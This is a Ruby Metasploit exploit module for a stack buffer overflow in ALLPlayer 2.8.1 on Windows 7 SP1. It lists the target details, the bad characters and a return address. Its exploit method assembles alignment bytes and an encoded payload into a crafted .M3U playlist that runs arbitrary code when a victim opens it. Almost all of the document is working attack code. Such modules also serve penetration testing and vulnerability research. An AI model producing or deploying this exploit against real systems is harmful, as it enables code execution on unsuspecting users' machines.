# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;ALLPlayer M3U Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a stack-based buffer overflow vulnerability in
        ALLPlayer 2.8.1, caused by a long string in a playlist entry.
        By persuading the victim to open a specially-crafted .M3U file, a
        remote attacker could execute arbitrary code on the system or cause
        the application to crash. This module has been tested successfully on
        Windows 7 SP1.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;metacom&#039;,      # Vulnerability discovery
          &#039;Mike Czumak&#039;,  # Original exploit
          &#039;Gabor Seljan&#039;  # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;BID&#039;, &#039;62926&#039; ],
          [ &#039;BID&#039;, &#039;63896&#039; ],
          [ &#039;EDB&#039;, &#039;28855&#039; ],
          [ &#039;EDB&#039;, &#039;29549&#039; ],
          [ &#039;EDB&#039;, &#039;29798&#039; ],
          [ &#039;EDB&#039;, &#039;32041&#039; ],
          [ &#039;OSVDB&#039;, &#039;98283&#039; ],
          [ &#039;URL&#039;, &#039;http://www.allplayer.org/&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;ExitFunction&#039; => &#039;process&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039;    => true,
          &#039;BadChars&#039;       => "\x00\x0a\x0d\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f",
          &#039;Space&#039;          => 3060,
          &#039;EncoderType&#039;    => Msf::Encoder::Type::AlphanumUnicodeMixed,
          &#039;EncoderOptions&#039; =>
            {
              &#039;BufferRegister&#039; => &#039;EAX&#039;
            }
        },
      &#039;Targets&#039;        =>
        [
          [ &#039; ALLPlayer 2.8.1 / Windows 7 SP1&#039;,
            {
              &#039;Offset&#039; => 301,
              &#039;Ret&#039;    => "\x50\x45",  # POP POP RET from ALLPlayer.exe
              &#039;Nop&#039;    => "\x6e"       # ADD BYTE PTR DS:[ESI],CH
            }
          ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Oct 09 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
        [
          OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.m3u&#039;])
        ],
      self.class)

  end


  def exploit
    nop = target[&#039;Nop&#039;]

    sploit =  rand_text_alpha_upper(target[&#039;Offset&#039;])
    sploit << "\x61\x50"      # POPAD
    sploit << target.ret
    sploit << "\x53"          # PUSH EBX
    sploit << nop
    sploit << "\x58"          # POP EAX
    sploit << nop
    sploit << "\x05\x14\x11"  # ADD EAX,0x11001400
    sploit << nop
    sploit << "\x2d\x13\x11"  # SUB EAX,0x11001300
    sploit << nop
    sploit << "\x50"          # PUSH EAX
    sploit << nop
    sploit << "\xc3"          # RET
    sploit << nop * 109
    sploit << payload.encoded
    sploit << rand_text_alpha_upper(10000) # Generate exception

    # Create the file
    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
    file_create("http://" + sploit)

  end
end

